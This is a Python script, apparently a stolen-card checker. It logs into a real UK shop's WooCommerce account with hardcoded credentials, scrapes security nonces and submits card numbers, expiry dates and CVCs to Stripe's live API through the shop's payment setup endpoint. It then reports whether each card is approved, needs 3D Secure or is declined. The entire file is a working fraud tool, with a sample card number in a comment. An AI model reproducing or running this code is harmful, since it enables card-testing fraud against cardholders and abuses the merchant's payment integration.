import requests
import requests
import re
import random

def Gele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]

    # Create a session
    session = requests.Session()
     
    user_agents = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
    ]
    random_user_agent = random.choice(user_agents)



    headers = {
    'authority': 'johnnysbackyard.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'cache-control': 'max-age=0',
    
    'referer': 'https://johnnysbackyard.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': random_user_agent,
}

    response = session.get('https://johnnysbackyard.co.uk/my-account/',  headers=headers)
  #  print(response.text)
    match = re.search(r'<input[^>]*name="woocommerce-login-nonce"[^>]*value="([^"]+)"', response.text)
    if match:
        login_nonce = match.group(1)
        print("Login Nonce:", login_nonce)
    else:
        #print("Login Nonce not found")
        return "Captcha detech"



    headers = {
    'authority': 'johnnysbackyard.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    
    'origin': 'https://johnnysbackyard.co.uk',
    'referer': 'https://johnnysbackyard.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': random_user_agent,
}

    data = {
    'username': 'ficada8620@baxidy.com',
    'password': 'xitioPass@1999',
    'woocommerce-login-nonce': login_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'login': 'Log in',
}

    response = session.post(
    'https://johnnysbackyard.co.uk/my-account/',
    
    headers=headers,
    data=data,
)




    headers = {
    'authority': 'johnnysbackyard.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
  
    'referer': 'https://johnnysbackyard.co.uk/my-account/payment-methods/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': random_user_agent,
}

    response = session.get('https://johnnysbackyard.co.uk/my-account/add-payment-method/',  headers=headers)
    
# Extract nonce using regex
    match = re.search(r'"createSetupIntentNonce"\s*:\s*"([a-zA-Z0-9]+)"', response.text)

    if match:
        nonce = match.group(1)
        print("Nonce value:", nonce)
    else:
       # print("Nonce not found.")
        return "Api Need update"
        
        
        

    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': random_user_agent,
}

    data = f'billing_details[name]=+&billing_details[email]=ficada8620%40baxidy.com&billing_details[address][country]=YE&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F0f795842d4%3B+stripe-js-v3%2F0f795842d4%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fjohnnysbackyard.co.uk&time_on_page=26072&client_attribution_metadata[client_session_id]=051412ee-2e91-45cc-b1ad-0bc42fd652fd&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7789fc4e-0cb5-4eb0-ae4e-92877eaa8df8&guid=8679103b-45ca-4667-8cb3-9e30fef2d54c7dc798&muid=06d318d0-c3a6-413d-94b6-4e891be1aa7b8c7f84&sid=4bf5c3fb-20db-43f8-933a-4f1bfaa5902cbcddc7&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1KQW8K2ENjnX48AP'

    response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        
    #print(response.text)
    response_data = response.json()  # Parse the response as JSON

    if 'error' in response_data:
        error_code = response_data['error']['code']
        if error_code == 'incorrect_number':
            return "Card number invalid"
        elif error_code == 'invalid_expiry_year':
            return "card expire date dekh"
        else:
            print("An error occurred:", response_data['error']['message'])
            return response_data['error']['message']
    else:
        
        response_json = response.json()
        id = response_json.get('id', 'No id found')
       # print(f"Payment source created successfully. ID: {id}") 
        
                       
                                                     


    headers = {
    'authority': 'johnnysbackyard.co.uk',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    
    
    'origin': 'https://johnnysbackyard.co.uk',
    'referer': 'https://johnnysbackyard.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': random_user_agent,
}

    payload = {
    'action': 'create_setup_intent',
    'wcpay-payment-method': id,  # Your Stripe Payment Method ID
    '_ajax_nonce': nonce  # Must be valid for your session and page
}
    response = session.post('https://johnnysbackyard.co.uk/wp-admin/admin-ajax.php',  headers=headers, data=payload)                                
    


    data = response.json()
    main_data = data.get('data', {})
    status = main_data.get('status')

    if data.get('success') == True and status == 'succeeded':
      #  print("Approved")
        return "Approved"
    elif data.get('success') == True and status == 'requires_action':
       # print("3D Required")
        return "3D Required"
    else:
        message = data.get("data", {}).get("error", {}).get("message", "")
        if "declined" in message.lower():
          #  print("Card was Declined")
            return "Card was Declined"
        else:
          #  print("Message:", message)
            return message
      
#print(Tele("4258810718226890|02|2027|653"))        
